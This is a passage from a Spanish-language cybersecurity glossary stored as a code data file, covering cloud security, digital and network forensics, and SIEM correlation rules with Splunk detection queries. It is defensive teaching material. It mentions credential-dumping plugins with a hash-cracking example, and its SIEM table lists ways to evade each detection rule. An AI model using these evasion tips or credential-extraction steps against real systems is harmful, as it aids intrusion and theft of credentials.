      "La **validación de entrada** es la **primera línea de defensa** contra inyección de código. Estrategia:\n" +
      "1. **Whitelist (preferida)** — solo aceptar caracteres/formatos conocidos (ej: email debe tener @).\n" +
      "2. **Blacklist** — rechazar patrones maliciosos (ej: rechazar <script>). ❌ Insuficiente (evasión).\n" +
      "3. **Normalización** — convertir entrada a forma canónica (ej: trim, lowercase).\n" +
      "4. **Escaping/Encoding** — transformar caracteres especiales (ej: < → &lt;).\n" +
      "5. **Longitud máxima** — prevenir buffer overflow / DoS (millones de caracteres).\n" +
      "> ⚠️ **Validación servidor-side es mandatoria**. La cliente (JavaScript) se puede bypassear.",
    examples: [
      "Email: validar con regex `/^[^@]+@[^@]+\\.[^@]+$/`.",
      "Password: mínimo 12 caracteres, mayús + minús + número + special char.",
      "Archivo subido: verificar extensión (jpg/png), tamaño (<5MB), mime type.",
    ],
    related: ["OWASP Top 10", "SQLi", "XSS", "Sanitización"],
  },

  // ── M37 · Seguridad en la Nube ──────────────────────────────────────────
  {
    id: 405,
    module: 37,
    term: "Cloud Security",
    short: "Proteger datos y aplicaciones en infraestructuras en la nube (AWS, Azure, GCP).",
    detail:
      "La nube traslada la **responsabilidad** pero no elimina el **riesgo**. Modelo de **responsabilidad compartida**:\n" +
      "| Responsabilidad | SaaS | PaaS | IaaS | On-Prem |\n" +
      "|---|---|---|---|---|\n" +
      "| Red | ☁️ Proveedor | ☁️ Proveedor | 🏢 Cliente | 🏢 Cliente |\n" +
      "| Computación | ☁️ Proveedor | ☁️ Proveedor | 🏢 Cliente | 🏢 Cliente |\n" +
      "| Datos | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente |\n" +
      "| Acceso/Identidad | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente |\n" +
      "**Riesgos clave de nube**:\n" +
      "• Configuración errónea de buckets S3 / blobs (público por accidente).\n" +
      "• IAM débil — demasiados permisos, credenciales hardcodeadas.\n" +
      "• Datos sin cifrar en tránsito o en reposo.\n" +
      "• Lateral movement entre instancias / workspaces.\n" +
      "> 💡 El 94% de breaches en nube fueron por error de configuración, no zero-day.",
    examples: [
      "Bucket S3 configurado como público → 165M registros de PII expuestos (Capital One 2019).",
      "Clave AWS commitida en GitHub → acceso a toda la infraestructura.",
    ],
    related: ["IAM (Identity and Access Management)", "Encriptación en tránsito vs reposo", "Compliance en la nube"],
  },
  {
    id: 406,
    module: 37,
    term: "IAM (Identity and Access Management)",
    short: "Sistema para autenticar usuarios y autorizar qué recursos pueden acceder.",
    detail:
      "**IAM** es la **columna vertebral** del control de acceso en cualquier infraestructura. Componentes:\n" +
      "• **Autenticación** — \"eres quién dices ser\" (credenciales, MFA, biometría).\n" +
      "• **Autorización** — \"tienes permiso para esta acción\" (roles, políticas).\n" +
      "• **Auditoría** — \"quién accedió a qué, cuándo\" (logs de acceso).\n" +
      "**Principios clave**:\n" +
      "1. **Mínimo privilegio** — cada usuario solo accede a lo que necesita.\n" +
      "2. **Separación de funciones** — el que aprueba compras ≠ el que las realiza.\n" +
      "3. **Revocación de acceso** — cuando se va un empleado, remover permisos **inmediatamente**.\n" +
      "4. **Rotación de credenciales** — cambiar contraseñas / keys regularmente.\n" +
      "> ⚠️ El **acceso sobreprivilegiado** (privilegio que no se usa) es deuda técnica = riesgo real.",
    examples: [
      "AWS IAM policy: `Principal: *, Action: *, Resource: *` = desastre; restringir a ARNs específicos.",
      "Service account con key de 5 años sin rotación → compromiso persiste.",
    ],
    related: ["Autenticación", "RBAC (Role-Based Access Control)", "Principio de mínimo privilegio"],
  },
  {
    id: 407,
    module: 37,
    term: "Encriptación en tránsito vs reposo",
    short: "Tránsito: datos en movimiento (TLS). Reposo: datos almacenados (AES, RSA).",
    detail:
      "Los datos tienen **dos estados** de riesgo:\n" +
      "\\n**En tránsito** (moving):\n" +
      "• TLS/SSL — encripta comunicación cliente-servidor.\n" +
      "• Certificados — autentica identidad del servidor (evita MITM).\n" +
      "• PFS (Perfect Forward Secrecy) — sesiones independientes, rotura de una key no afecta otras.\n" +
      "\\n**En reposo** (storage):\n" +
      "• AES-256 (simétrica) — cifra archivos, BD, backups.\n" +
      "• RSA (asimétrica) — cifra keys, firma documentos.\n" +
      "• Key rotation — cambiar keys criptográficas periódicamente.\n" +
      "• Escrow / Cold storage — backups cifrados offsite.\n" +
      "> ⚠️ Datos sin encriptar en reposo son accesibles si alguien roba el servidor / disco.",
    examples: [
      "HTTPS (TLS) en todas las páginas → tránsito seguro.",
      "Contraseñas hasheadas (bcrypt) en BD → incluso si roban la BD, no recuperan plain-text.",
      "Backup cifrado con AES-256 + key guardada en HSM aparte.",
    ],
    related: ["Criptografía", "TLS/SSL", "Gestión de claves", "PFS"],
  },
  {
    id: 408,
    module: 37,
    term: "Compliance en la nube",
    short: "Cumplimiento normativo: GDPR, HIPAA, PCI-DSS, SOC 2, ISO 27001 en entornos cloud.",
    detail:
      "Regulaciones imponen requisitos sobre **dónde** y **cómo** se almacenan datos:\n" +
      "| Marco | Aplicable | Requisitos clave |\n" +
      "|---|---|---|\n" +
      "| **GDPR** | UE | Datos personales cifrados, derecho al olvido, consentimiento explícito |\n" +
      "| **HIPAA** | Salud (USA) | Datos médicos cifrados, auditoría, acceso limitado |\n" +
      "| **PCI-DSS** | Tarjetas de crédito | Cardholder data environment aislado, tokenización |\n" +
      "| **SOC 2** | SaaS vendors | Controles de seguridad verificados por auditor externo |\n" +
      "| **ISO 27001** | General | SGSI completo: políticas, riesgos, tratamientos, auditoría |\n" +
      "**Desafío en nube**: multi-tenancy — tus datos pueden estar en el mismo servidor que datos de un competidor. Mitigación: cifrado client-side + segregación de network.",
    examples: [
      "GDPR: usuario de EU solicita derecho al olvido → eliminar todos sus datos en 30 días.",
      "PCI-DSS: no almacenar CVV en BD; usar tokenización de PCI-compliant processor.",
    ],
    related: ["Gestión de riesgos", "Auditoría y compliance", "Privacidad de datos"],
  },
  {
    id: 409,
    module: 37,
    term: "Identidad federada y SSO",
    short: "Un único login (IdP central) para acceder a múltiples aplicaciones.",
    detail:
      "**SSO (Single Sign-On)** permite autenticarse una sola vez:\n" +
      "1. Usuario abre app A; es redirigido a IdP (Google, Okta, Azure AD).\n" +
      "2. Entra credenciales en IdP.\n" +
      "3. IdP genera un token (SAML, OpenID Connect, OAuth 2.0).\n" +
      "4. App A acepta token y concede acceso.\n" +
      "5. Usuario abre app B → ya tiene token, acceso instantáneo.\n" +
      "**Ventajas**: gestión centralizada, MFA en un solo lugar, auditoría unificada.\n" +
      "**Riesgos**: si el IdP se compromete, todos los apps están comprometidos. **Defensa**: MFA en IdP, monitoreo de anomalías.",
    examples: [
      "Google Sign-in: inicio en Gmail y acceso automático a YouTube, Drive, Photos.",
      "Okta como IdP empresarial: emplea entra MFA, accede a Jira, Salesforce, Slack en una sesión.",
    ],
    related: ["Autenticación", "MFA", "OAuth 2.0 y OpenID Connect", "Zero Trust"],
  },

  // ── M39 · Forense Digital: Fundamentos ─────────────────────────────────
  {
    id: 420,
    module: 39,
    term: "Cadena de custodia",
    short: "Documentación rigurosa de quién, cuándo, dónde y por qué se manipuló evidencia digital para validez legal.",
    detail:
      "La **cadena de custodia** es la **columna vertebral** de la admisibilidad en juicio. Cada mano que toque la evidencia debe quedar registrada. **Ruptura = inadmisibilidad**.\n" +
      "\\n**Requisitos fundamentales**:\n" +
      "→ **Integridad** — evidencia no fue modificada (hash criptográfico idéntico)\n" +
      "→ **Autenticidad** — es real y vinculado al incidente (firmas, testigos)\n" +
      "→ **Trazabilidad** — quién accedió cuándo y por qué (acta de custodia)\n" +
      "\\n**Orden de Volatilidad** (capturar de más volátil a más persistente):\n" +
      "1. CPU registers, cache (segundos)\n" +
      "2. **RAM** (procesos, claves, malware)\n" +
      "3. Conexiones de red, tablas ARP\n" +
      "4. **Disco** (filesystem, archivos borrados)\n" +
      "5. Logs remotos, backups, archivos históricos\n" +
      "> ⚠️ Apagar un sistema antes de capturar RAM = pérdida de evidencia clave. La orden importa.",
    examples: [
      "Disk clonado a las 14:30 UTC. Hash SHA256 registrado. Sello de tamper tape. Acta firmada por 3 testigos.",
      "Ruptura de cadena: alguien modificó el disco sin registrar. La evidencia es rechazada en corte.",
    ],
    related: ["Investigación forense", "Adquisición de evidencia", "Estándares forenses"],
  },
  {
    id: 421,
    module: 39,
    term: "Adquisición de evidencia forense",
    short: "Proceso de clonar/capturar datos de un sistema comprometido sin alterarlos.",
    detail:
      "**Adquisición** = crear una **copia forense bit-a-bit** del original. Herramientas:\n" +
      "• **dd** (Linux) — comando básico, genera imagen raw\n" +
      "• **ddrescue / dcfldd** — copian y reportan errores, intentan recuperación\n" +
      "• **FTK Imager** — GUI, computa hashes en tiempo real\n" +
      "• **Guymager** — Linux, interfaz amigable\n" +
      "• **EnCase** — estándar industria, genera archivos .E01 (comprimido, segmentado)\n" +
      "\\n**Método seguro**:\n" +
      "1. **Write-blocker** (hardware o software) — impide escrituras al original\n" +
      "2. Conectar original a máquina forense vía blocker\n" +
      "3. Clonar a un disco limpio y certificado\n" +
      "4. Hashear original y copia (deben coincidir)\n" +
      "5. Documentar: fecha, hora, herramienta, versión, operador\n" +
      "6. Sellar físicamente (tamper tape) y digitalmente (firma criptográfica)",
    examples: [
      "Servidor comprometido: usamos FTK Imager + write-blocker USB. Imagen a disco externo. SHA256 verificado. Acta de custodia.",
      "Laptop encriptado: sin decryption, clonamos el disco physicamente. Post-incidente, el dueño proporciona credenciales.",
    ],
    related: ["Cadena de custodia", "Write-blockers", "Hashing de integridad"],
  },
  {
    id: 422,
    module: 39,
    term: "Herramientas forenses",
    short: "Software de análisis de imagen, extracción de artefactos y documentación de hallazgos.",
    detail:
      "**Suite forense completa**:\n" +
      "| Herramienta | Función | Plataforma |\n" +
      "|---|---|---|\n" +
      "| **Autopsy / FTK** | GUI, análisis de image, file carving, keyword search | Windows, Linux, macOS |\n" +
      "| **The Sleuth Kit (TSK)** | CLI, toolkit base, manejo de filesystems | Windows, Linux |\n" +
      "| **Volatility** | Memory forensics, análisis de volcado RAM | Windows, Linux |\n" +
      "| **Wireshark** | Análisis PCAP, reconstructor de streams | Windows, Linux, macOS |\n" +
      "| **EnCase** | Investigación end-to-end, legal admisible | Windows |\n" +
      "| **SANS DFIR Toolkit** | Suite integrado (múltiples herramientas) | Windows, Linux |\n" +
      "\\n**Operación típica en Autopsy**:\n" +
      "1. Importar imagen forense (.raw, .E01, .dd)\n" +
      "2. Analizar filesystems (NTFS, ext4, APFS)\n" +
      "3. Recuperar archivos borrados via artefactos MFT\n" +
      "4. Búsqueda por keywords (C2 domains, attacker names)\n" +
      "5. Timeline: M/A/C times → secuencia de eventos\n" +
      "6. Generar reporte con hallazgos indexados",
    examples: [
      "Autopsy encontró 47 archivos .jpg borrados en $Recycle.Bin. Carving recuperó 43. Screenshots de C2 panel.",
      "Volatility extrajo tabla de procesos de volcado RAM: svchost.exe fake ejecutando powershell remotamente.",
    ],
    related: ["Análisis de disco", "Análisis de memoria", "File carving"],
  },
  {
    id: 423,
    module: 39,
    term: "Documentación y reporte forense",
    short: "Registro detallado, reproducible y defendible de hallazgos forenses para auditoría y litigio.",
    detail:
      "El **reporte forense** es la salida de toda la investigación. Requisitos legales:\n" +
      "\\n**Estructura del reporte**:\n" +
      "1. **Resumen ejecutivo** — qué pasó en alto nivel (no técnico)\n" +
      "2. **Alcance y metodología** — qué se examinó, herramientas, estándares seguidos (NIST, SANS)\n" +
      "3. **Hallazgos** — evidencia presentada de forma clara, con capturas y timeline\n" +
      "4. **Cadena de custodia** — registro de quién tocó qué cuándo\n" +
      "5. **Conclusiones** — responder preguntas de investigación planteadas\n" +
      "6. **Apéndices** — detalles técnicos, hashes, reglas YARA, salidas de herramientas\n" +
      "\\n**Princ ipios de redacción**:\n" +
      "→ **Objetividad** — solo hechos, no especulaciones\n" +
      "→ **Reproducibilidad** — otro forense podría corroborar pasos y resultados\n" +
      "→ **Completitud** — responder todas las preguntas de investigación\n" +
      "→ **Legibilidad** — sin jerga, explica conceptos técnicos\n" +
      "→ **Trazabilidad** — cada hallazgo vinculado a fuente (archivo, hash, timestamp)\n" +
      "> 💡 El reporte se defiende en cross-examination. Debe ser impecable.",
    examples: [
      "Reporte concluye: 'Atacante accedió vía RDP el 2024-03-15 a las 02:30 UTC desde IP 185.220.102.4 (Tor exit node)' con 15 evidencias citadas.",
      "Cross-exam: 'Did you verify the system clock was correct?' → Sí, verificamos offset via NTP logs.",
    ],
    related: ["Cadena de custodia", "Investigación forense", "Admisibilidad en juicio"],
  },

  // ── M40 · Forense: Disco y Memoria ──────────────────────────────────────
  {
    id: 430,
    module: 40,
    term: "Análisis de filesystem",
    short: "Examinar la estructura lógica del disco: archivos, carpetas, permisos, timeline y artefactos.",
    detail:
      "**Filesystem** es la organización lógica del disco. Análisis busca:\n" +
      "\\n**Artefactos Windows (NTFS)**:\n" +
      "→ **MFT** (Master File Table) — registro de todos los archivos, incluyendo borrados\n" +
      "→ **$LogFile** — transacciones NTFS (intent log), recupera secuencia de cambios\n" +
      "→ **$UsnJrnl** — Change Journal, qué cambió y cuándo\n" +
      "→ **Prefetch** (C:\\Windows\\Prefetch) — qué exes se ejecutaron (nombre, timestamp, ruta)\n" +
      "→ **Registry Hives** — NTLM hashes, configuración de persistencia, USB history\n" +
      "\\n**Artefactos Linux**:\n" +
      "→ **ext4 Superblock + Inodes** — metadatos de archivos\n" +
      "→ **/var/log/** — auth.log (SSH, sudo), syslog (eventos del sistema)\n" +
      "→ **.bash_history** — comandos ejecutados\n" +
      "→ **Journald** — systemd logs (binarios, pero indexados)\n" +
      "\\n**Timeline reconstruction**:\n" +
      "→ M/A/C times: Modified / Accessed / Changed\n" +
      "→ Autopsy / FTK generan timeline visual (gráfico vs tiempo)\n" +
      "→ Identifica patrones: ataque a las 02:30, cleanup a las 03:15, etc.",
    examples: [
      "MFT muestra archivo 'dump_hashes.exe' borrado a las 14:45. $LogFile confirma el comando de delete y quién lo ejecutó (SYSTEM).",
      "ext4 timeline: 100+ archivos modificados en /var/www/ a las 02:10 UTC (defacement). Log muestra Apache crash en ese momento.",
    ],
    related: ["Herramientas forenses", "Recuperación de datos", "Análisis de timeline"],
  },
  {
    id: 431,
    module: 40,
    term: "Análisis de memoria (RAM)",
    short: "Examinar procesos, credenciales, conexiones y código inyectado capturado en el volcado de RAM.",
    detail:
      "**Volatility 3** es el estándar. Plugins clave:\n" +
      "\\n**Procesos**:\n" +
      "→ `windows.pslist` — árbol de procesos (parent-child)\n" +
      "→ `windows.pstree` — vista jerárquica\n" +
      "→ `windows.malfind` — identifica código inyectado (anomalías de memoria, regiones no-mapped)\n" +
      "\\n**Red**:\n" +
      "→ `windows.netscan` — conexiones TCP/UDP, puertos locales y remotos\n" +
      "→ `windows.netstat` — versión clásica (deprecated pero funciona)\n" +
      "\\n**Credenciales**:\n" +
      "→ `windows.hashdump` — extrae hashes NTLM de SAM (crackeable offline)\n" +
      "→ `windows.lsadump` — extrae claves de cifrado LSA (Kerberos keys, cached credencials)\n" +
      "→ `windows.cachedump` — cached credentials de logons locales\n" +
      "\\n**Información del Sistema**:\n" +
      "→ `windows.envars` — variables de entorno (paths, usernames)\n" +
      "→ `windows.registry` — hives cargados en RAM\n" +
      "→ `windows.handles` — archivos abiertos, registry keys abiertos\n" +
      "→ `windows.dlllist` — DLLs cargadas por proceso\n" +
      "\\n**Ventaja**: código descifrado en RAM (no hay que desempacar binarios), malware vivo, credenciales en claro.",
    examples: [
      "Volatility encontró proceso 'svchost.exe' (PID 1234) con DLL maliciosa cargada. Memory dump del proceso contiene 'evil.com' (C2).",
      "hashdump extrajo hash NTLM de admin. John crackea en 2 minutos: password123. Esa fue la contraseña comprometida.",
    ],
    related: ["Adquisición de RAM", "Volatility Framework", "Malware detection"],
  },
  {
    id: 432,
    module: 40,
    term: "Volatility Framework",
    short: "Herramienta de análisis de memoria con plugins especializados por sistema operativo y propósito.",
    detail:
      "**Volatility 3** reemplazó Volatility 2 (legacy). Diseño modular:\n" +
      "→ Plugins por SO: windows.*, linux.*, mac.*\n" +
      "→ Profiles detectan versión del SO automáticamente\n" +
      "\\n**Instalación y uso**:\n" +
      "```bash\npip install volatility3\nvol -f memory.dmp windows.info         # detecta SO, build, plugins disponibles\nvol -f memory.dmp windows.pslist      # lista procesos\nvol -f memory.dmp -p PID windows.memmap  # mapea memoria del PID\nvol -f memory.dmp -p PID windows.vadinfo # anota regiones de memoria\n```\n" +
      "\\n**Workflow típico**:\n" +
      "1. Volcado de RAM (WinPmem/LiME/osxpmem)\n" +
      "2. Correr `windows.info` para entender el profile\n" +
      "3. `pslist` → identificar procesos sospechosos\n" +
      "4. `netscan` → conexiones C2\n" +
      "5. `malfind` → inyección de código\n" +
      "6. Dump del proceso malicioso (`windows.dumpfiles`) → análisis estático en Ghidra\n" +
      "7. Reporting de hallazgos\n" +
      "> ⚠️ Volatility es poderoso pero lento (GB de RAM = minutos de análisis). Optimiza plugins para PID específicos.",
    examples: [
      "vol -f dump.dmp windows.malfind encontró memoria anómala en PID 5432 (PowerShell). Dumpeamos, analizamos en Ghidra.",
      "vol -f dump.dmp windows.netscan mostró 50+ conexiones a 192.0.2.1:443 desde PID 1337 cada 5 segundos (beaconing C2).",
    ],
    related: ["Análisis de memoria", "Procesos y threads", "Inyección de código"],
  },
  {
    id: 433,
    module: 40,
    term: "File carving y recuperación",
    short: "Técnica de recuperar archivos borrados buscando firmas de archivo (magic bytes) sin depender del filesystem.",
    detail:
      "**File carving** ignora el filesystem e identifica archivos por su **estructura interna** (magic bytes):\n" +
      "→ PDF comienza con `%PDF-`\n" +
      "→ PNG: `89 50 4E 47` (magic bytes)\n" +
      "→ JPEG: `FF D8 FF E0` (SOI marker)\n" +
      "\\n**Herramientas**:\n" +
      "| Herramienta | Uso |\n" +
      "|---|---|\n" +
      "| **Foremost** | CLI, clásica, configurable |\n" +
      "| **Scalpel** | CLI, más rápida, regex support |\n" +
      "| **Autopsy** | GUI integrada, file carving automático |\n" +
      "| **Stellar** | Comercial, orientada a usuario |\n" +
      "\\n**Proceso**:\n" +
      "1. Copiar imagen forense a disco temporario\n" +
      "2. `scalpel -i image.dd -o output_dir/` (scan completo)\n" +
      "3. Carving encuentra `recovered_files/`\n" +
      "4. Clasificar por tipo (jpg, pdf, docx, zip, etc)\n" +
      "5. Validar integridad (algunos fragmentos pueden ser corruptos)\n" +
      "\\n**Limitaciones**:\n" +
      "→ No recupera el nombre de archivo original (renombrado a hash)\n" +
      "→ Archivos comprimidos/cifrados: solo recuperas el contenedor, no contenido\n" +
      "→ Falsos positivos: datos que coinciden con magic bytes pero no son archivo real\n" +
      "> 💡 Complementa el análisis de filesystem (algunos archivos borrados quedan en sectores no asignados).",
    examples: [
      "Scalpel en disco de suspect: encontró 237 JPEGs borrados en /dev/sda3. 15 eran screenshots de C2 panel.",
      "Carving en zona no-asignada: archivo Office docx donde atacante escribió instrucciones (cifrado destruido, contenido recuperado).",
    ],
    related: ["Análisis de disco", "Recuperación de datos", "Herramientas forenses"],
  },

  // ── M41 · Forense de Red ────────────────────────────────────────────────
  {
    id: 440,
    module: 41,
    term: "Análisis de PCAP",
    short: "Inspeccionar tráfico capturado (Wireshark, NetworkMiner) para reconstruir flujo de ataques.",
    detail:
      "**PCAP** (packet capture) es el registro de todo lo que pasó por el cable. Análisis permite:\n" +
      "→ Identificar atacante (IP, puertos, User-Agent)\n" +
      "→ Mapear lateral movement (conexiones inter-host)\n" +
      "→ Detectar exfiltración (volumen/destino de datos saliente)\n" +
      "→ Encontrar C2 (beaconing, DNS tunneling)\n" +
      "→ Recuperar payloads (archivos transferidos en texto claro o zip)\n" +
      "\\n**Herramientas**:\n" +
      "| Herramienta | Función |\n" +
      "|---|---|\n" +
      "| **Wireshark** | GUI, análisis granular, búsqueda, coloreado por protocolo |\n" +
      "| **tshark** | CLI, automatizable |\n" +
      "| **NetworkMiner** | Extrae automáticamente IPs, dominios, archivos |\n" +
      "| **Zeek (Bro)** | IDS + parser, genera logs estructurados (conn.log, dns.log, http.log) |\n" +
      "| **Suricata** | IDS/IPS, reglas Yara, JSON output |\n" +
      "\\n**Workflow en Wireshark**:\n" +
      "1. Cargar PCAP (File → Open)\n" +
      "2. Filtros: `ip.src == 192.0.2.5` (solo origen específico)\n" +
      "3. Right-click → Follow TCP Stream (ver conversación completa)\n" +
      "4. Statistics → Conversations (top talkers)\n" +
      "5. File → Export → Objects → HTTP (descargar archivos capturados)",
    examples: [
      "Wireshark Follow Stream: 10 comandos PowerShell bajados vía HTTP desde evil.com. Scripts salvados.",
      "NetworkMiner automáticamente extrajo 47 archivos: EXE malicioso, DLLs, credential dump en TXT.",
    ],
    related: ["Detección de C2", "Forense de red", "Zeek / Bro"],
  },
  {
    id: 441,
    module: 41,
    term: "Detección de Command & Control (C2)",
    short: "Identificar comunicación entre malware y servidor controlado por atacante en el tráfico de red.",
    detail:
      "**C2 detection** busca patrones del malware llamando 'a casa':\n" +
      "\\n**Patrones típicos**:\n" +
      "→ **Beaconing** — conexiones periódicas y regulares (cada 5 min exacto → sospechoso)\n" +
      "→ **DNS tunneling** — subdominios aleatorios/largos (ej: aB3xY9z.c2domain.com)\n" +
      "→ **HTTP User-Agent raro** — (ej: Mozilla/1.0 bot)\n" +
      "→ **Conexiones a puertos no-standard** (ej: 443 pero plaintext HTTP)\n" +
      "→ **DGA** (Domain Generation Algorithm) — dominio que cambia diariamente\n" +
      "→ **HTTPS con certificado auto-signed** (sin CA chain válida)\n" +
      "\\n**Herramientas de detección**:\n" +
      "• **RITA** (Real Intelligence Threat Analytics) — detecta beaconing por análisis estadístico\n" +
      "• **JA3/JA3S** — fingerprint de handshakes TLS (identifica cliente malicioso aunque cifre)\n" +
      "• **Zeek DNS log** — query a IPs en blocklists (abuse.ch, VirusTotal)\n" +
      "• **YARA rules** — pattern matching en payloads\n" +
      "\\n**Análisis en PCAP**:\n" +
      "1. `tshark -r pcap -n -q -z io,stat,1 | grep C2IP` (volumen por IP)\n" +
      "2. Suricata con ET Malware ruleset (activar alertas)\n" +
      "3. NetworkMiner auto-marca conexiones a IPs en blocklists",
    examples: [
      "RITA analizó Zeek logs: IP 185.220.102.4 enviaba HTTPS a 192.0.2.1:8443 cada 300 segundos (beaconing detectado).",
      "DNS query a mínisuciosamente.ru, y a los 5 min exacto se repite (DGA behavior). IP destino en abuse.ch.",
    ],
    related: ["Análisis de PCAP", "Indicadores de compromiso", "Threat intelligence"],
  },
  {
    id: 442,
    module: 41,
    term: "Zeek (Bro) para análisis de red",
    short: "Framework de monitoreo de red que genera logs estructurados (JSON/TSV) de conexiones, DNS, HTTP.",
    detail:
      "**Zeek** (antes 'Bro') es el **parser de tráfico de referencia**. Monitorea en tiempo real y genera **logs**:\n" +
      "\\n**Logs principales**:\n" +
      "→ **conn.log** — todas las conexiones (IP, puerto, protocolo, bytes, timestamp)\n" +
      "→ **dns.log** — queries/responses DNS (dominio, tipo, TTL, respuesta)\n" +
      "→ **http.log** — requests HTTP (método, URI, referrer, User-Agent, status code)\n" +
      "→ **ssl.log** — handshakes HTTPS (cipher, versión TLS, certificado)\n" +
      "→ **files.log** — archivos transferidos (hash, MIME type)\n" +
      "→ **notice.log** — alertas según políticas\n" +
      "\\n**Instalación y uso**:\n" +
      "```bash\nzeek -i eth0 -r pcap.pcapng -C              # offline analysis, ignore checksums\ncat conn.log | zeek-cut ts id.orig_h id.orig_p id.resp_h id.resp_p proto service bytes  # formato tabular\n```\n" +
      "\\n**Ventajas frente a Wireshark**:\n" +
      "→ Automatizado (no GUI, scripting de políticas)\n" +
      "→ Logs estructurados (fácil de parsear en SIEM)\n" +
      "→ Detección de anomalías integrada\n" +
      "→ Escalable a millones de conexiones/día\n" +
      "→ Integrable con SIEM (Splunk, ELK)",
    examples: [
      "Zeek conn.log: 10,000 conexiones a 185.220.102.4:8443 en 1 hora (volumen anómalo). Alerta disparada.",
      "http.log muestra 50 GET a /api/cmd?id=BOTID (pattern matching identifica bot callback).",
    ],
    related: ["Análisis de PCAP", "IDS/IPS", "Logs estructurados"],
  },
  {
    id: 443,
    module: 41,
    term: "Correlación de eventos forenses",
    short: "Unir artefactos de disco, memoria y red en una timeline para reconstruir el ataque completo.",
    detail:
      "La **reconstrucción del incidente** requiere **correlacionar** todas las fuentes:\n" +
      "\\n**Fuentes de datos**:\n" +
      "1. **Disco**: MFT timestamps, $UsnJrnl, prefetch, registry\n" +
      "2. **Memoria**: procesos, conexiones, credenciales, código inyectado\n" +
      "3. **Red**: PCAP (conexiones, DNS, HTTP, C2)\n" +
      "4. **Logs**: syslog, auth.log, Event Viewer, Apache, firewall\n" +
      "5. **SIEM**: correlación de alertas pre-existentes\n" +
      "\\n**Metodología**:\n" +
      "1. **Crear timeline unificada** (convertir todos los timestamps a UTC)\n" +
      "2. **Marcar eventos clave**:\n" +
      "   - 02:10 UTC: archivo exploit.exe descargado (PCAP HTTP.log)\n" +
      "   - 02:12 UTC: exploit.exe ejecutado (prefetch timestamp)\n" +
      "   - 02:15 UTC: procesos sospechosos creados (volatility pslist, Event ID 4688)\n" +
      "   - 02:16 UTC: conexión a 185.220.102.4 (PCAP netscan, netstat.log)\n" +
      "   - 02:20 UTC: datos copiados a C:\\temp (MFT $UsnJrnl)\n" +
      "   - 02:25 UTC: datos exfiltrados via HTTPS (conn.log, volumen anómalo)\n" +
      "3. **Responder preguntas de investigación**:\n" +
      "   - ¿Quién compromete? (IP, geoip, user-agent)\n" +
      "   - ¿Cuándo? (timestamp first/last contact)\n" +
      "   - ¿Qué accedió? (datos identificados en exfil)\n" +
      "   - ¿Cómo persiste? (scheduled task, registry Run key)\n" +
      "   - ¿Evidencia de movimiento lateral? (conexiones inter-host)\n" +
      "\\n**Herramientas**:\n" +
      "• **Timeline maker** (Autopsy) — genera CSV de timeline\n" +
      "• **Excel** — PivotTables y gráficos\n" +
      "• **Splunk** — ingesta de múltiples logs, correlación en queries",
    examples: [
      "Timeline correlacionada de 12 horas muestra 89 eventos. Patrón claro: 14 horas entre primer acceso y exfiltración total.",
      "Evento de sysmon (Process Creation ID 1) en 02:12 vs memory dump: mismo hash EXE. Confirmación de ejecución.",
    ],
    related: ["Análisis de disco", "Análisis de memoria", "Análisis de PCAP"],
  },

  // ── M42 · SIEM y Monitoreo ──────────────────────────────────────────────
  {
    id: 450,
    module: 42,
    term: "SIEM (Security Information and Event Management)",
    short: "Plataforma centralizada que ingesta logs de toda la infraestructura, correlaciona y alerta sobre incidentes.",
    detail:
      "Un **SIEM** es el **corazón del SOC**. Centraliza:\n" +
      "→ Logs de firewall (denies, connections)\n" +
      "→ Logs de servidor (acceso, errores, cambios)\n" +
      "→ Logs de seguridad (windows Event logs, Linux syslog)\n" +
      "→ Logs de aplicación (autenticación, transacciones)\n" +
      "→ Logs de endpoint (EDR, antivirus detecciones)\n" +
      "\\n**Funciones principales**:\n" +
      "1. **Ingesta** — recolectar logs (TCP/syslog, HTTP, agentes)\n" +
      "2. **Normalización** — formatear a campo común (timestamp, user, action, outcome)\n" +
      "3. **Correlación** — activar alertas cuando múltiples eventos encajan\n" +
      "4. **Búsqueda** — investigación retroactiva (\"qué pasó hace 3 días?\")\n" +
      "5. **Retención** — almacenar 90-365 días para auditoría\n" +
      "6. **Reporte** — dashboards, compliance reports\n" +
      "\\n**Plataformas**:\n" +
      "| SIEM | Costo | Escalabilidad | Ease of Use |\n" +
      "|---|---|---|---|\n" +
      "| **Splunk** | $$$$ (muy caro) | ★★★★★ | ★★★ (SPL potente) |\n" +
      "| **Microsoft Sentinel** | $$$ (cloud) | ★★★★★ | ★★★★ (KQL similar a SQL) |\n" +
      "| **ELK/Elastic** | $ (open) | ★★★★ | ★★★★ (Kibana bueno) |\n" +
      "| **Wazuh** | $ (open) | ★★★ | ★★★ (buena comunidad) |\n" +
      "| **QRadar** | $$$$ | ★★★★ | ★★ (complejo) |\n" +
      "> 💡 Costo típico: 1-3 USD por GB ingested (Splunk), cloud mide por usuarios/eventos.",
    examples: [
      "SIEM correlaciona: 10 fallidos de login + 1 éxito + cambio de grupo = account compromise probable → alerta automatizada.",
      "Query retroactiva: \"source_ip=192.0.2.5 AND action=accessed AND object=/secret\" → auditoría de quién vio datos sensibles.",
    ],
    related: ["Logs estructurados", "Reglas de correlación", "Dashboards"],
  },
  {
    id: 451,
    module: 42,
    term: "Reglas de correlación SIEM",
    short: "Definiciones de patrones multi-evento que disparan alertas cuando un ataque probable se detecta.",
    detail:
      "Una **regla de correlación** dice: \"si suceden estos eventos en este orden/ventana, es sospechoso\".\n" +
      "\\n**Tipos de reglas**:\n" +
      "| Tipo | Ejemplo | Evasión |\n" +
      "|---|---|---|\n" +
      "| **Brute force** | >20 login fails en 5 min → alerta | Espaciar intentos (1 por minuto) |\n" +
      "| **Privilege escalation** | User agregado a Administrators → alerta | Ejecutar comando sin UAC (require credencial) |\n" +
      "| **Data exfiltration** | >1 GB saliendo a IP externa → alerta | Comprimir, encriptar, mezclar con tráfico legítimo |\n" +
      "| **Lateral movement** | SMB connection de user X a 10+ hosts → alerta | Usar credencial robada vs nuevo host |\n" +
      "| **Malware C2** | Conexión a IP en blocklist → alerta | Usar dominio legitimate (typosquatting) |\n" +
      "\\n**Escritura en Splunk SPL (Search Processing Language)**:\n" +
      "```spl\n# Detectar brute force SSH\nevent_type=ssh action=failed | stats count by src_ip | where count > 20\n\n# Detectar lateral movement\nevent_type=smbconnect | stats dc(dest_host) as unique_hosts by user | where unique_hosts > 10\n\n# Detectar descarga de malware conocido\nevent_type=file_downloaded filename=* | lookup malware_hashes hash | where status=known_malware\n```\n" +
